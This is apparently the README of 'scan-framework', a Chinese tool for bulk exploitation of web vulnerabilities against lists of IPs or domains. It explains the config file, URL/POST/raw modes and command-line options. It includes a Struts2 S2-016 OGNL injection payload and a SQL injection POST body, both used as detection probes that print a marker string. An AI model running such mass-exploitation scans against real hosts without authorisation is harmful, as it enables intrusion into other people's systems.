# scan-framework

------

scan-framework是一个漏洞批量利用扫描框架，只需要进行简单配置，就可以变成一个任意漏洞批量利用的工具，前提是你必须有漏洞的payload、扫描的IP或者域名列表。

你可以使用 scan-framework：

> * 进行GET方法的形式的漏洞批量扫描
> * 进行POST方法的形式的漏洞批量扫描
> * 进行Http原始报文的漏洞批量扫描

------

## 使用步骤

> * 确保收集一个有效的漏洞探测payload
> * 有一个待扫描的IP或者域名列表
> * 触发漏洞的页面中有代表漏洞探测成功的特征字符串
> * 会使用scan-framework的配置文件
> * 入口文件为cli.py 命令行参数-m

## 配置文件
配置文件位于工程中的conf文件夹下：
```
[main]
# 扫描为真的规则（支持正则）
scan_rule = hacker
# 扫描后收集结果的规则（支持正则）
res_rule = hacker
# 扫描使用的payload
payload = redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22hacker%22),%23p.close()}
# 使用raw方法，放置http报文的文件
raw_file = 
# 待扫描ip列表的文件
ip_file = c:\\ip.txt
#输出结果的文件
out_file = c:\\res.txt
# 开启的线程数
thread_num = 8
# 请求的方式
method = get
```
上面是一个典型的get方法的漏洞扫描的配置，其中特征字符串尾hacker，扫描中可以根据**scan_rule**判断是否存在漏洞，使用**res_rule**获取漏洞触发页面上的一些信息，这个两个选项支持正则匹配，你可以写入判断依据的正则表达式，scan-framework会使用它们进行爬取。

##两种扫描方式
**url**模式下，可以扫描如下形式的漏洞，比如S2-016漏洞：
```
http://127.0.0.1:8080/struts_hello/hello?redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22hacker%22),%23p.close()}
```
如果网站有漏洞，那么在页面上会显示出*hacker*字符串，只需要配置:
```
scan_rule = hacker
```
上面是一种get方式的漏洞扫描。
当method = post时，payload为POST数据包中请求体，如：
```
username=admin' and 1=1&password=xxss&login=1
```
**raw**模式下，要求配置文件中raw_file不为空，而是指定一个保存http请求报文的文件，文件中可能是下面的形式：
```
GET /code/test.php HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36 SE 2.X MetaSr 1.0
Referer: http://127.0.0.1/code/
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=bv2n8m904ggt8nsi9istnm9fg7


```

##命令行参数
```
>python cli.py -h
Usage: cli.py [options]

Options:
  -h, --help            show this help message and exit
  -m MODE, --mode=MODE
```
选择相应的模式：
> * -m url 对应URL模式
> * -m raw 对应RAW模式

##Bug反馈
请联系：
exploitcat@foxmail.com
